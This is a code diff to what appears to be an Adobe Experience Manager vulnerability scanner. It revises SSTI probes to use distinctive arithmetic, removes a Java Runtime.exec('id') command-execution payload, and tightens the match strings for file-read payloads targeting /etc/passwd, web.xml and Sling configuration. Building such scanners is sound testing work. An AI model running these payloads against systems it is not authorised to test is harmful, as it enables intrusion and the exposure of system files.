@@ -30,36 +30,36 @@ class InjectionPayload:
 class InjectionTestingModule:
     """Advanced injection testing for AEM vulnerabilities."""
     
-    # SSTI payloads targeting Sling/HTL
+    # SSTI payloads targeting Sling/HTL - use unique math to avoid false positives
     SSTI_PAYLOADS = [
         InjectionPayload(
             "Sling Expression EL",
-            "${1+1}",
-            "2",
+            "${7*7}",
+            "49",
             "ssti"
         ),
         InjectionPayload(
             "HTL Expression",
-            "${'7'*7}",
-            "7777777",
+            "${3+5*2}",
+            "13",
             "ssti"
         ),
         InjectionPayload(
             "Sling Scripting",
-            "<%= 1+1 %>",
-            "2",
+            "<%= 3+5*2 %>",
+            "13",
             "ssti"
         ),
         InjectionPayload(
             "JSP Expression",
-            "${T(java.lang.Runtime).getRuntime().exec('id')}",
-            "uid",
+            "${T(java.lang.Math).PI}",
+            "3.14",
             "ssti"
         ),
         InjectionPayload(
-            "Groovy Simple",
-            "${1+1}",
-            "2",
+            "String Concat Math",
+            "${'a'+'b'+'c'}",
+            "abc",
             "ssti"
         ),
         InjectionPayload(
@@ -127,25 +127,25 @@ class InjectionTestingModule:
         InjectionPayload(
             "JCR Root",
             "/",
-            "jcr:primaryType",
+            '"jcr:primaryType"',
             "lfi"
         ),
         InjectionPayload(
             "Etc Passwd",
             "/etc/passwd",
-            "root:x",
+            "root:x:0:0:",
             "lfi"
         ),
         InjectionPayload(
             "Web XML",
             "/WEB-INF/web.xml",
-            "web-app",
+            "<web-app",
             "lfi"
         ),
         InjectionPayload(
             "Sling Properties",
             "/../sling.properties",
-            "sling",
+            "sling.run.modes",
             "lfi"
         ),
         InjectionPayload(
@@ -157,7 +157,7 @@ class InjectionTestingModule:
         InjectionPayload(
             "Config JSON",
             "/../config.json",
-            "{",
+            '"server":',
             "lfi"
         ),
     ]
